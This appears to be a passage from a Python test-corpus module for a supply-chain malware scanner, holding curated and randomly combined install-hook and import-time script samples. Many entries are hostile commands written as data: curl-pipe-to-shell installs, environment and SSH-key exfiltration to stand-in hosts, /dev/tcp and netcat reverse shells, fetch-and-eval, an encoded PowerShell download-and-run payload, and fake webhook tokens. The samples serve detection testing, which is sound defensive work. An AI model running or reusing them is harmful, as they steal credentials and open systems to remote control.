"""The hooks parity corpus: the inputs both parity tests of the install-hook
and supply-chain functions read — the npm engine's (test_js_parity_hooks.py)
and the Rust engine's (test_rust_parity_hooks.py) — and core's answers for
one case (core_view), field by field (FIELDS). Not a test: a plain module of
shared data, so neither test imports the other.

Realistic hook commands and install / import-time scripts (CURATED and the
*_CURATED lists), then a seeded random stream of cases built from pieces
each mechanism looks at (MIXED, QUOTING, CD, …): see corpus().
"""
import base64
import json
import os
import random

from lazaret.scanner import core

FIELDS = ("shlex tokens", "_hook_tokens", "follow_hook", "install_script_risk", "import_time_risk",
          "node_candidates", "_NODE_E_RE codes", "shebang_lang", "import_time_risk py", "import_time_risk js",
          "self_publish_at", "runs_dll", "join_string_pieces", "decoded_view", "spawned_scripts")

# Realistic hook commands and install / import-time scripts
CURATED = [
    "bun run index.js", "bun index.js", "bun ./postinstall.mjs || node ./postinstall.mjs", "deno run -A main.ts",
    "tsx scripts/x.ts", "ts-node -r ./pre.js src/x.ts", "bun run build", "bun install", "bun --smol run ./x.mjs",
    "bun -e \"require('./a')\"", "BUN.EXE run x.cjs", "deno run --config deno.json main.ts", "vite-node ./s.mts",
    "node install.js", "node ./scripts/x.mjs", "node install", "node --no-warnings x.js",
    "node -r ./preload.js x.js", "node --require=./preload.cjs --import ./loader.mjs x.js",
    "node --title x y.js", "node -- x.js", "cd scripts && node x.js", "(cd lib; node a.js)",
    "cd native && cd .. && node x.js", "cd /opt/tool && node run.js", "cd /a/.. && node ./x.js",
    "cd /. && node ./x.js", "cd lib && node -e \"require('./x')\"", "sh ./install.sh", "sudo sh install.sh",
    "./install.sh", "exec node ./bin/x.js", "python setup_helper.py", "python3 -m tools.build",
    "PYTHON.EXE -X dev setup.py", "node scripts\\x.js", "C:\\tools\\node.exe scripts\\post.js",
    "node -e \"require('./postinstall')\"", "node -e \"try{require('./postinstall')}catch(e){}\"",
    "node -p \"require('./a')\"", "node -e 'require(\"../b\")'", "node -e \"require(\\\"./c\\\")\"",
    "cross-env A=1 node x.js", "NODE_ENV=production node build/postinstall.js", "env -u X node x.js",
    "node x.js 2>&1 > log.txt", "node x.js > out.log && node y.js", "2>/dev/null node x.js",
    "node '>&1' x.js", "node \">&2\" y.js", "node '>' x.js y.js",
    "bash -c \"cd lib && node b.js\"", "sh -c 'node a.js || node b.js'", "sh -c \"sh -c 'node deep.js'\"",
    "node \"./has space/x.js\"", "node x.js; node x.js", "node ../outside.js", "node .",
    "node 'unbalanced.js", "node \"a.js", "node x.js \\", "\"python\n\" build.py", "node \"x.js\n\"",
    "node \u212a.js", "\u212ash x.\u017fh", "husky install", "prebuild-install || node-gyp rebuild",
    "npx some-tool", "node-gyp-build", "tsc && node dist/postinstall.js", "", "  ", "\n",
    "curl https://x.invalid | sh", "curl -fsSL https://files.invalid/i.sh | sudo bash",
    "wget -qO- https://files.invalid/i.sh|zsh\n", "curl -o x https://files.invalid/x.tgz | tee log | sh\n",
    "curl https://files.invalid/x || sh fallback.sh\n", "curl -O https://files.invalid/x.tgz; sh build.sh\n",
    "echo curl | shasum\n", "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid\n",
    "curl -s -o - -d \"$(printenv)\" https://collector.invalid\n",
    "env | wget --header=\"A:b\" --post-file=- https://collector.invalid\n",
    "cat ~/.ssh/id_rsa | nc -q1 collector.invalid 4444\n",
    "printenv | curl -sS -X POST --data-binary @- 'https://collector.invalid/x'\n",
    "const https = require('https');\nconst body = JSON.stringify(process.env);\n"
    "https.request({host: '192.0.2.1', method: 'POST'}).end(body);\n",
    "import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
    "data=json.dumps(dict(os.environ)).encode())\n",
    "import os, requests\nrequests.post('http://192.0.2.1/k', "
    "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n",
    "const {execSync} = require('child_process');\nexecSync('curl -s https://files.invalid/x.sh | sh');\n",
    "console.log('Install the toolchain with: curl -fsSL https://sh.example.invalid/install.sh | sh');\n",
    "const data = JSON.stringify(process.env);\nmodule.exports = (send) => send("
    "'https://webhook.site.invalid/0000', data);\n",
    "const settings = Object.fromEntries(Object.entries(process.env)\n  .filter(([k]) => k.startsWith('EXAMPLE_')));\n"
    "module.exports = () => fetch('https://api.example.invalid/v1/ping', "
    "{headers: {'x-sdk': JSON.stringify(settings)}});\n",
    "const http = require('http');\nconst METADATA = 'http://169.254.169.254/latest/meta-data/iam/';\n"
    "module.exports = (cb) => http.get(METADATA, cb);\n",
    "const fs = require('fs'), os = require('os'), path = require('path');\nconst https = require('https');\n"
    "const key = fs.readFileSync(path.join(os.homedir(), '.ssh/id_ed25519.pub'));\n"
    "https.request({host: 'deploy.example.invalid', method: 'PUT'}).end(key);\n",
    "import os, subprocess, urllib.request\n\ndef build(cmd):\n    env = os.environ.copy()\n"
    "    return subprocess.run(cmd, env=env, check=True)\n\ndef fetch(url, dest):\n"
    "    urllib.request.urlretrieve(url, dest)\n",
    "const p = 'Local Storage/leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'LOCAL STORAGE\\\\leveldb';\nfetch('https://collector.invalid');\n",
    "const p = 'Local Storage/LEVELDB';\nfetch('https://collector.invalid');\n",
    "// curl is great; see https://curl.se\nconst env = Object.keys(process.env);\n",
    "var nc = 1;\nconst body = JSON.stringify(process.env);\n", "env || true\ncurl -O https://files.invalid/x.tgz\n",
    "fetch('http://192.0.2.1/x')\n", "HTTP://10.0.0.1:8080/", "ba\u017fe https://pastebin.com.invalid/raw/x",
    "exec(\"bash -i >& /dev/tcp/192.0.2.1/4444 0>&1\")\n", "{**os.environ}\nimport httpx\n",
    "curl " + "--a-b " * 25 + "x", "curl -a " * 200 + "https://files.invalid", "| sh " * 50,
    # wrappers and their options, fd numbers, node -e in a directory, the limits
    "sudo -u me node x.js", "sudo -E -H node x.js", "sudo -D sub node x.js", "sudo --chdir=sub node x.js",
    "env -i node x.js", "env - node x.js", "env -u X node x.js", "env -uX node x.js", "env --unset=X node x.js",
    "env -C sub node x.js", "env -Csub node x.js", "env --chdir sub node x.js", "cd a && env -C ../b node x.js",
    "env -C ~ node x.js", "env -S \"node x.js\"", "env -S'node -r ./p.js x.js'", "env --split-string='node y.js'",
    "env -S 'cd lib && node z.js'", "nice -n 5 node x.js", "nice -10 node x.js", "time -o f.txt node x.js",
    "time -p node x.js", "exec -a name node x.js", "dotenv -e .env -- node x.js", "dotenv -v A=1 node x.js",
    "command -p node x.js", "nohup node x.js &", "sudo -u me env -C sub A=1 node x.js", "sudo -- node x.js",
    "1>out node x.js", "2>&1 node x.js", "node x.js 2> err.log", "node x.js 2>&1 3>&- 4<in",
    "echo 5 > f; node x.js", "node -e \"require('./a')\" && cd lib && node --eval=\"require('./b')\"",
    "cd lib && node -p \"require('../c')\"", "npx node -e \"require('./d')\"",
    "cd a;" * 1200 + "node x.js", "node x.js;" * 1200, " ".join(f"node s{n}.js" for n in range(150)).replace(" node", "; node"),
    "node " + "a" * 4100 + ".js", "cd " + "a" * 4095 + " && node x.js", "x" * 100_001, "\U0001F600" * 50_001,
    "node " + "\U0001F600" * 99_990,
    # #! lines
    "#!/usr/bin/env node\n", "#!/usr/bin/node --harmony\nx", "#! /usr/bin/env -S deno run --allow-all\n",
    "#!/usr/bin/env bun", "#!/usr/local/bin/ts-node", "#!/usr/bin/env tsx\r\n", "#!/usr/bin/python3.11 -u\n",
    "#!/usr/bin/env PYTHON3", "#!C:/Python/python.exe", "#!/bin/sh\n", "#!/usr/bin/env -i bash -x",
    "#!/usr/bin/env\nnode\n", "#!\n/usr/bin/node", "#!/usr/bin/env \n", "#!/usr/bin/perl -w\n",
    "#!/usr/bin/env -S", "#!env node", "#!/usr/bin/env A=1 node", "\ufeff#!/usr/bin/env node", " #!/bin/sh",
    "#!/bin/\u212ash", "#!/usr/bin/env \u017fh", "#!/usr/bin/nodejs\x1cx", "#!/usr/bin/env\xa0node",
    # code that runs what it receives over the network (runs_received_code), and
    # downloads substituted into a command line (runs_substituted_download)
    "import subprocess, urllib.request\ncode = urllib.request.urlopen('https://files.invalid/p.js')"
    ".read().decode()\nsubprocess.run(['node', '-e', code])\n",
    "import requests\nexec(requests.get('https://files.invalid/p.py').text)\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (res) => {\n  let b = '';\n"
    "  res.on('data', (c) => { b += c; });\n  res.on('end', () => eval(b));\n});\n",
    "fetch('https://files.invalid/p')\n  .then((r) => r.text())\n  .then((code) => new Function(code)());\n",
    "execSync(`node -e ${await (await fetch(u)).text()}`)\n", "os.system(f'python -c \"{requests.get(u).text}\"')\n",
    "const m = /v(\\d+)/.exec(await (await fetch(u)).text());\n", "execSync('npm i -g x@' + (await r.json()).v);\n",
    "sh -c \"$(curl -fsSL https://files.invalid/i.sh)\"\n", "source <(curl -s https://files.invalid/e.sh)\n",
    "eval \"$(wget -qO- https://files.invalid/i.sh)\"\n", "node -e \"$(curl -s https://files.invalid/p.js)\"\n",
    "require('child_process').execSync('bash -c \"$(curl -fsSL https://files.invalid/i.sh)\"');\n",
    "x" * 1500 + ";eval(await(await fetch('https://files.invalid/p')).text());",
    # quotes paired from a call's '(' (a regex literal's quote before it), a
    # value read past a cut argument list, callbacks of an inline require(),
    # shell=True calls, and names past the searches (an index of the text)
    "/'/.test(s); new Function('a', https.get('https://files.invalid/p'));\n",
    "/'/.test(s); code = await (await fetch(u)).text(); /'/.test(s);\neval(code);\n",
    "eval(" + "\U0001d41a" * 240 + ", " + "\u00e9" * 150 + ", await fetch(u))\n",
    "require('https').get(u, (res) => { res.on('data', (c) => { b += c; }); res.on('end', () => eval(b)); });\n",
    "import subprocess, requests\nx = requests.get(u).text\nsubprocess.run(\n  x, shell=True)\n",
    "shell=True\n" + "run(" * 300 + "fetch(u);" + "z" * 900,
    "".join(f"const f{i} = (u) => fetch(u);\n" for i in range(70)) + "eval(await f69(u));\n",
    "".join(f"import requests as r{i}\n" for i in range(70)) + "exec(r69.get(u).text)\n",
    "x = fetch(u); y = x; " + "a, " * 40 + "z = y\neval(z)\n",
    "'eval(" * 30 + "fetch(u))\n", "\"'`eval(" * 20 + "x\nx = fetch(u)\n",
    # runner aliases, indirect eval, deserialization (CWE-502) and dynamic
    # import of a received specifier (the three added sink families)
    "const e = eval;\nconst code = await (await fetch('https://files.invalid/p')).text();\ne(code);\n",
    "import os, requests\ns = os.system\ns(requests.get('https://files.invalid/p').text)\n",
    "const ex = require('child_process').execSync;\nex(await (await fetch(u)).text());\n",
    "const code = await (await fetch(u)).text();\n(0, eval)(code);\n",
    "const code = await (await fetch(u)).text();\neval.call(null, code);\n",
    "const code = await (await fetch(u)).text();\nwindow['eval'](code);\n",
    "import pickle, requests\npickle.loads(requests.get('https://files.invalid/p').content)\n",
    "import marshal, urllib.request\nmarshal.loads(urllib.request.urlopen(u).read())\n",
    "import yaml, requests\nyaml.load(requests.get(u).text)\n",
    "import yaml, requests\nyaml.load(requests.get(u).text, Loader=yaml.SafeLoader)\n",   # data-only: not it
    "const s = require('node-serialize');\ns.unserialize(await (await fetch(u)).text());\n",
    "const name = await (await fetch('https://files.invalid/p')).text();\nawait import(name);\n",
    "const name = await (await fetch(u)).text();\nrequire(name);\n",
    "import importlib, requests\nimportlib.import_module(requests.get(u).text)\n",
    "import requests\n__import__(requests.get(u).text)\n",
    "const e = eval; e(JSON.parse(x));\n",                    # alias, but no received value: not it
    "x = os.system\nx('ls -la')\n",                            # alias of a fixed command: not it
    # download to a file, then run the file (import-time MAJOR only)
    "import requests, subprocess, sys\ndata = requests.get('https://files.invalid/p').content\n"
    "open('x.py', 'wb').write(data)\nsubprocess.run([sys.executable, 'x.py'])\n",
    "const body = await (await fetch('https://files.invalid/p')).text();\nfs.writeFileSync('m.js', body);\nrequire('./m.js');\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/t', 'tool.py')\n"
    "subprocess.run(['python', 'tool.py'])\n",
    "const https = require('https');\nhttps.get('https://files.invalid/p', (r) => r.pipe(fs.createWriteStream(dst)));\n"
    "fork(dst);\n",
    "const body = await (await fetch(u)).text();\nfs.writeFileSync('cache.json', body);\n",   # written, not run: not it
    "fs.writeFileSync('x.js', localData);\nrequire('./x.js');\n",                              # no download: not it
    # (0.1.8) run by a command line a literal holds: its program, or what start, cmd, sh … are given
    "import os, requests\nr = requests.get('https://cdn.invalid/i.bat')\nopen('install.bat', 'wb').write(r.content)\n"
    "os.system('set X=1 | start install.bat')\n",
    "const https = require('https');\nhttps.get(u, (r) => r.pipe(fs.createWriteStream('run.sh')));\n"
    "spawn('sh', ['-c', 'chmod +x run.sh && ./run.sh']);\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/x', 'x.bat')\n"
    "subprocess.run('cmd /c x.bat', shell=True)\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://x.invalid/x', 'x.tgz')\n"
    "subprocess.run('tar xzf x.tgz', shell=True)\n",                                      # unpacked, not run
]

# The pieces random cases are made of. MIXED reaches every function; the
# others are dense in one mechanism, so that its rarer paths come up often.
MIXED = [
    " ", " ", "  ", "\t", "\n", "\r", "\r\n", "'", "'", "'", '"', '"', '"', "\\", "\\", "\\", "\\\\",
    "&", "|", ";", "(", ")", "<", ">", "&&", "||", ";;", ">>", ">&", "&>", "2>&1", "<<", ">|", "|&",
    "=", "$", "-", "--", "0", "1", "2", "9", "a", "b", "x", "/", ".", "..", "~",
    "node", "nodejs", "node.exe", "NODE", "sh", "bash", "zsh", "sh.exe", "python", "python3", "python3.11",
    "bun", "bun.exe", "deno", "tsx", "ts-node", "BUN", "run", "install", "a.ts", "b.tsx", "c.mts",
    "py", "PYTHON.EXE", "cd", "pushd", "env", "cross-env", "sudo", "exec", "A=1", "NODE_ENV=production",
    "-e", "-p", "--eval", "-r", "--require", "--import", "--loader=", "-c", "-m", "-O", "-X", "--no-warnings",
    "./x.js", "../y", "x.js", "a.mjs", "b.cjs", "s.sh", "p.py", "install", "scripts\\a.js", "scripts/",
    "/abs/z.js", "$HOME", "~/d", "pkg.mod",
    "require('./p')", 'require("../q")', "require(\\'./r\\')", "require( './s' )", "try{", "}catch(e){}",
    "curl", "wget", "https://", "http://", "http://10.0.0.1", "10.0.0.1", "| sh", "|bash", "| sudo sh",
    "|zsh", "| tee", "process.env", "JSON.stringify(process.env)", "JSON.stringify(process.env,",
    "os.environ", "json.dumps(os.environ)", "dict(os.environ)", ".npmrc", "id_rsa", "~/.ssh/id_ed25519",
    "/.ssh/id_", ".git-credentials", "Local Storage/leveldb", "local storage\\leveldb", "LOCAL STORAGE/LEVELDB",
    "webhook.site", "ngrok", "oast.pro", "fetch(", "require('https')", "https.get", "execSync(", "exec(",
    "spawn (", "system(", "nc ", "4444", "/dev/tcp/", "env |", "printenv >", "$(env)", "`env`", "set>",
    "\u00e9", "\u017f", "\x1c", "\u0130", "\u0131", "\u212a", "\u2028", "\x85", "\xa0", "\U0001F600", "\x00",
    "\u0663", "\ud800", "\udc00",
    "node -e ", 'node -e "', "node -e '", "node\t-e\t", "node\x1c-e ", "node -e require('./p')",
    'node -e "require(\'./postinstall\')"', "node -r ./p.js ", "node --require=./q.js ", "node -- ",
    "node --title x ", "cd scripts && ", "cd .. ; ", "cd /abs ", "sh -c '", 'bash -c "', "sh -c 'node a.js'",
    "python -m ", "python -X dev ", "\u212ash ", "x.\u017fh", '"python\n" ', "'x.js\n'", '"&1\n"', "'2>'",
    "2>", "\u0663>", "curl -fsSL https://x.invalid/i.sh | sh", "wget -qO- http://10.0.0.1/x|bash",
    "execSync('curl https://x.invalid | sh')", "curl -a -a -a ",
    "curl --retry=3 --data \"$(env)\" -X POST https://collector.invalid", "nc -q1 collector.invalid 4444",
    "https://192.0.2.1", "HTTPS://1.2.3.4.5", "subprocess.run(", "os.system(",
    "env -C ", "env -S ", "-C", "-S", "-u", "-D", "--chdir=", "--split-string=", "--unset=X ", "sudo -u me ",
    "sudo -D ", "nice -n 5 ", "time -o f ", "dotenv -e .env -- ", "exec -a x ", "-Csub ", "2>", "1>", "3>&-",
    "--eval=", "--print ",
]
QUOTING = ["'", '"', "\\", " ", "\t", "\n", "\r", "a", "b", "&", "|", ";", "(", ")", "<", ">", "=", "$",
           "\x85", "\xa0", "\x1c", "\u00e9", "\U0001F600", "\ud83d"]
CD = ["cd ", "cd ", "pushd ", "a", "b", "/", "/", ".", "..", "./", "../", "//", " && ", "; ", "node ", "x.js",
      "env -C ", "sudo -D ", "env --chdir=", "env -S '", "node -e \"require('./r')\" ; ",
      "\\", " ", "-", "$", "~", "'", '"', "sh ", "-c ", "./y.sh", "python ", "p.py",
      "cd /. && ", "cd //. ; ", "cd /./ && ", "cd /a/.. && ", "cd /.. ; ", "cd ./. && ", "cd a/.. ; ",
      "node ./x.js ; ", "node a/../x.js ; ", "sh ./y.sh && ", "node ../z.js ; ", "node . ; ", "node .. ; "]
NODE_E = ["node -e ", "node\t-e\x1c", "node  -e  ", "node -e", "node", " ", "\t", "\x1c", "-e", '"', '"', "'", "'",
          "\\", "\\", "\n", "\r", "a", "require('./p')", "require(\\'./q\\')", "(", ")", "./", "../"]
SCRIPT = ["\n", "\n", " ", "curl -s ", "wget -qO- ", "https://files.invalid/x.sh", " | sh", "|bash", " | sudo zsh",
          ";", "&", "|", "execSync('", "subprocess.run(\"", "os.system('", "')", "\")", "system (",
          "JSON.stringify(process.env)", "JSON.stringify(process.env, null)", "json.dumps(dict(os.environ))",
          "str(os.environ)", "urlencode(os.environ)", "~/.ssh/id_rsa", "/.ssh/id_ed25519.pub", "id_dsa",
          ".git-credentials", "Local Storage/leveldb", "LOCAL STORAGE\\leveldb", "local storage/LEVELDB",
          "fetch(", "require('https')", "from 'node:net'", "import requests", "socket.socket(", "nc ",
          "192.0.2.1 4444", "/dev/tcp/", "https://192.0.2.1", "webhook.site", "\u0131nteract.sh", "api.telegram.org",
          "x.onion", "env | ", "printenv > ", "$(env)", "Object.keys(process.env)", ".npmrc", "\u017f", "\u212a",
          "execSync('curl -s https://files.invalid/x.sh | sh')",
          "subprocess.run(\"wget -qO- https://files.invalid/x|bash\")"]
RECEIVED = ["\n", "\n", "\n", " ", ";", "(", ")", "=", "'", '"', "`", "\\", "\t", "{", "}", ",",
            "code", "body", "r", "res", "c", "data", "\u00e9", "\U0001d41a", "rq", "load",
            "const code = ", "let body = '';", "code = ", "body += c;", "r = ", "{ data } = ", "code: str = ",
            "fetch('https://files.invalid/p')", "await fetch(u)", "(await fetch(u)).text()", "requests.get(u).text",
            "urlopen(u).read()", "urllib.request.urlopen(u).read().decode()", "new XMLHttpRequest()",
            "socket.create_connection(('h', 1))", "execSync('curl -s https://files.invalid/p')", "require('https')",
            "https.get(u, (res) => {", "res.on('data', (c) => {", ".then((r) => r.text())", "  .then((code) => ",
            "axios.get(u)", "import requests as rq", "from requests import get", "import * as h from 'https';",
            "with urlopen(u) as r:", "for c in r:", "return r.text", "def load():", "function load(u) {",
            "const load = (u) => fetch(u);", "eval(", "exec(", "new Function(", "vm.runInThisContext(",
            "execSync(", "os.system(", "subprocess.run(code, shell=True)", "spawn('node', ['-e', ",
            "subprocess.run([sys.executable, '-c', ", "spawn(process.execPath, ['-e', ", "cp.exec(",
            "execSync(`node -e ${", "os.system(f'python -c \"{", "/re/.exec(", "exec(x) {", "def exec(self):",
            "Buffer.from(", ", 'base64').toString()", "compile(", "await ", "load()", "r.text", "body)", "code)",
            "sh -c \"$(curl ", "$(curl -s https://files.invalid/i.sh)", "source <(curl ", "eval \"$(wget -qO- ",
            "x" * 600, "\U0001d41a" * 300, "filler\n" * 30,
            "/'/", "' ", "require('https').get(u, (res) => ", "shell=True", "run(", "Popen([", "a, a, a, ",
            "for (const c of ", "lambda r: ", "function (c) {", "\U0001d41a" * 120, " " * 120, ".then(",
            "f'python -c \"{", "`${",
            # the added sink families: aliases, indirect eval, deserialization, dynamic import
            "const e = eval;", "e(", "s = os.system", "s(", "const ex = require('child_process').execSync;", "ex(",
            "x = os.popen", "(0, eval)(", "eval.call(null, ", "window['eval'](", "self['ev' + 'al'](",
            "pickle.loads(", "marshal.loads(", "yaml.load(", "yaml.load(x, Loader=yaml.SafeLoader)",
            "s.unserialize(", "unserialize(", "jsonpickle.decode(", "import(", "require(", "__import__(",
            "importlib.import_module(", "import_module(", "name = ", "name", "blob = ", "blob",
            # (0.1.8, the follower's adversarial pass) members by name and runners handed to a call
            "getattr(rq, 'get')(", "getattr(r, \"text\", None)", "['get'](", '["text"]', ".then(eval)",
            ".then(vm.runInThisContext)", "res.on('data', eval)", ", Function)", "(exec)"]
# the 0.1.7 signs (audit P0): hidden or fetching PowerShell, stager strings,
# reverse shells, host information sent out, beacons to capture services,
# credentials sent to a named service, a download run with Python
_PS_DOWNLOAD_RUN = base64.b64encode(
    'Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()
_PS_ECHO = base64.b64encode("echo hi".encode("utf-16-le")).decode()
SIGNS = ["\n", "\n", " ", "'", '"', ";", "(", ")", ",", "=", "\\",
         "subprocess.Popen(", "powershell", "pwsh.exe", "PowerShell.exe", " -WindowStyle Hidden", " -EncodedCommand ",
         " -enc ", " -e ", " -EC ", " /e ", _PS_DOWNLOAD_RUN, _PS_ECHO, "QUJD", "AAAAA", _PS_DOWNLOAD_RUN[:-2] + "=",
         " -c \"irm https://x.invalid/i.ps1 | iex\"", "IEX (New-Object Net.WebClient).DownloadString('https://x.invalid/a')",
         "Invoke-WebRequest -Uri https://x.invalid/a.exe -OutFile a.exe", "Start-Process a.exe", "iwr https://x.invalid/p |",
         " iex", "(New-Object Net.WebClient).DownloadFile('https://x.invalid/a', 'a.exe')",
         'b"""from urllib.request import urlopen as u;exec(u(\'https://x.invalid/p\').read())"""',
         "'import requests;exec(requests.get(\"https://x.invalid\").text)'", "`eval(await (await fetch(u)).text())`",
         "f.write(", "os.dup2(s.fileno(), 0)", "os.dup2(s.fileno(),1)", "subprocess.call(['/bin/sh', '-i'])",
         "pty.spawn('/bin/bash')", "socket.socket()", "s.connect((h, 4444))", "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1",
         "nc -e /bin/sh 10.0.0.1 4242", "const sh = require('child_process').spawn('/bin/sh', []);",
         "client.pipe(sh.stdin);", "new net.Socket()", "socket.gethostname()", "os.hostname()", "getpass.getuser()",
         "subprocess.getoutput('whoami')", "$(whoami)", "`hostname`", "requests.post('https://webhook.site/x', data=d)",
         "urllib.request.urlopen('https://x.invalid/?h=' + h)", "https://abc.oastify.com", "pipedream.net",
         "api.telegram.org", "JSON.stringify(process.env)", "json.dumps(dict(os.environ))",
         "discord.com/api/webhooks/1/x", "data = requests.get(u).content", "open('x.py', 'wb').write(data)",
         "subprocess.run([sys.executable, 'x.py'])", "subprocess.run(['python3', 'x.py'])", "\U0001F600", "x" * 100]
SIGN_CURATED = [
    f"subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand {_PS_DOWNLOAD_RUN}', shell=False)",
    f"subprocess.run(['powershell.exe', '-enc', '{_PS_ECHO}'])", f"pwsh -e {_PS_DOWNLOAD_RUN}",
    f"PowerShell /EC {_PS_ECHO}", f"powershell -nop -w hidden -encodedcommand {_PS_DOWNLOAD_RUN[:40]}",
    "powershell -enc QUJD", f"powershell\n-enc {_PS_ECHO}", f"execSync(\"powershell -e {_PS_DOWNLOAD_RUN}\")",
    "import requests, subprocess, sys\ndata = requests.get(u).content\nopen('x.py', 'wb').write(data)\n"
    "subprocess.run([sys.executable, 'x.py'])\n",
    "import urllib.request, subprocess\nurllib.request.urlretrieve('http://files.invalid/t', 'tool.py')\n"
    "subprocess.run(['python', 'tool.py'])\n",
]
# exfiltration (0.1.8): a chat bot or webhook whose secret is in the code,
# credential files sent to a raw IP address, a sweep of credential folders,
# the host name sent to a base64-hidden address or in a DNS name, the public
# IP address sent to a capture service, a copy of the environment
# serialized, a reverse shell as an argument list or to an ngrok TCP address,
# a miner, a raw socket to a hard-coded address, browser shortcuts rewritten.
# The secrets are built here (fake, and not written out whole in the source).
_TG = "1234567" + "89:AA" + "bC3dE5fG7hJ9kL1mN3pQ5rS7tV9wX1yZ3"
_DISCORD = "discord.com/api/webhooks/" + "123456789012345678/" + "aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789-_aBcDeFgHiJkLmNoPqRsTuVwXyZ01"
_SLACK = "hooks.slack.com/services/" + "TABCDEF12/" + "BABCDEF12/" + "aBcDeFgHiJkLmNoPqRsTuV12"
_KEY = "Zx9" + "Qw7Er5Ty3Ui1Op0As2Df4Gh6"
_XMR = "4" + ("AbCdEfGhJk" * 10)[:94]
EXFIL = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
         "requests.post(", "fetch(", "https.get(", "import requests\n", "urllib.request.urlopen(", "curl -s ",
         _TG, "api.telegram.org/bot", "https://" + _DISCORD, "https://" + _SLACK, "T00000000", "X" * 24,
         "'.env'", "'~/.npmrc'", "'.aws/credentials'", "'/.ssh/id_rsa'", "http://203.0.113.9:8855/",
         "https://198.51.100.7/x", "http://10.0.0.1/", "'.ssh'", "'.aws'", "'.ethereum'", "'.kube'", "'.docker'",
         "'$HOME/.gnupg'", "socket.gethostname()", "os.hostname", "'aHR0cHM6Ly9hLmludmFsaWQ='",
         'socket.getaddrinfo(f"{h}.x.invalid.com", 80)', "dns.lookup(`${h}.x.invalid.com`)", "api.ipify.org",
         "webhook.site/abc", "abcdef12.ngrok-free.app", "2.tcp.eu.ngrok.io", "'bash'", "'nc'", "spawn(", "'-e'",
         "'/bin/sh'", "env = dict(os.environ)", "urlencode(env)", "const e = {...process.env}", "JSON.stringify(e)",
         "'203.0.113.5'", "sock.connect((ip, 80))", "'8.8.8.8'", _XMR, "'-o'", "stratum+tcp://pool.invalid:3333",
         "subprocess.Popen(", "CreateShortcut", "--load-extension=x", ".lnk", "'.lnk'", ".Arguments = x",
         ".TargetPath = y", "\U0001F600", "\u00e9"]
# (0.1.8) DNS names built outside a template, in a name, in a shell command; dead drops; the host name
# read through require('os') and imports (an alphabet of its own: the one above keeps its odds)
EXFIL_MORE = ["\n", "\n", " ", "'", '"', "`", "(", ")", "[", "]", ",", ";", "=", "{", "}", "/", ".", "\\",
              "dns.lookup(", "socket.gethostbyname(", "h + '.x.invalid.com'", "'%s.x.invalid.com' % h",
              "'{}.x.invalid.com'.format(h)", "q = h + '.u.x.invalid.com'\n", "lookup(q)", "h + '.local'", "nslookup ",
              "dig ", "ping -c1 ", "$(whoami).x.invalid.com", "`hostname`.x.invalid.com", "%USERNAME%.x.invalid.com",
              "$USER.x.invalid.com", "curl http://", "os.system('nslookup ' + h + '.x.invalid.com')",
              "require('os').hostname()", "const { hostname } = require('os');", "from socket import gethostname\n",
              "socket.gethostname()", "os.hostname()",
              "cfg = requests.get('https://x.github.io/c.json').json()\n", "requests.post(cfg['url'], json=h)",
              "fetch('https://x.github.io/c.json').then(r => r.json()).then(c => fetch(c.hook, {method: 'POST', body: h}))",
              "for w in cfg['hooks']:\n    ", "urllib.request.Request(w, data=b)",
              "with urlopen('https://x.github.io/c') as r:\n", "return cfg\n", "def load():\n    ", "\U0001F600"]
EXFIL_REASONS = (
    # (0.1.8) shapes that are exfiltration wherever they are found
    "sends data to a webhook whose secret is written in the code",
    "collects files from several credential folders and sends data over the network",
    "sends the machine's user or host name to an address it hides in base64",
    "sends the machine's user or host name in a DNS lookup of a name it builds",
    "sends the machine's user or host name to an address it fetches at run time",
    "runs a cryptocurrency miner", "rewrites the shortcuts of programs on the machine",
    # (0.1.8) local data read, followed and sent (install time), and a beacon
    "sends environment variables over the network", "sends the machine's user or host name over the network",
    "sends what local commands report about the machine over the network", "uploads a local file over the network",
    "reads files outside the package and sends them over the network",
    "sends the machine's public IP address over the network",
    "sends what the cloud's instance metadata service gives it", "tells a server it was installed",
    # (0.1.8) and at import time, where it goes
    "reads credentials or the whole environment and sends data over the network",
    "reads credentials or the whole environment and sends them to an exfiltration service",
    "reads credentials or the whole environment and sends them to an IP address",
    "reads local files and sends them to an exfiltration service", "reads local files and sends them to an IP address",
    "sends the machine's user or host name to a data-capture service",
    "sends the machine's user or host name to an IP address",
    "sends what local commands report about the machine to a data-capture service",
    "sends what local commands report about the machine to an IP address",
    "sends the machine's public IP address to a data-capture service",
    "sends the machine's public IP address to an IP address")
EXFIL_CURATED = [
    # RequestBin by its host names only: requestBinary() is chromedriver's download function
    "function requestBinary(o, p) { return request(o).pipe(fs.createWriteStream(p)); }\n"
    "requestBinary(getRequestOptions(), f);\n",
    "https.get('https://enx1.x.requestbin.net/r/abc?d=' + process.env.NPM_TOKEN);\n",
    "requests.post('https://requestb.in/abc', data=socket.gethostname())\n",
    "const u = 'requestbin.io/requestBin'; fetch(u + os.hostname());\n",
    "import requests\nTOKEN = '" + _TG + "'\ndef go():\n    requests.post(f'https://api.telegram.org/bot{TOKEN}"
    "/sendDocument', files={'document': open('w.zip', 'rb')})\n",
    "const url = 'https://" + _SLACK + "';\nfetch(url, { method: 'POST', body: JSON.stringify({ text: 'hi' }) });\n",
    "const url = 'https://" + _DISCORD + "';\nfetch(url, { method: 'POST' });\n",
    "const url = 'https://hooks.slack.com/services/T00000000/B00000000/" + "X" * 24 + "';\nfetch(url);\n",
    "const fs = require('fs');\nconst https = require('https');\nconst d = fs.readFileSync('.env', 'utf8');\n"
    "https.get(`https://203.0.113.9:8855/1?data=${encodeURIComponent(d)}`);\n",
    "import os, urllib.request\nDIRS = [os.path.join(H, d) for d in ['.ssh', '.aws', '.ethereum', '.docker', '.kube']]\n"
    "urllib.request.urlopen(req)\n",
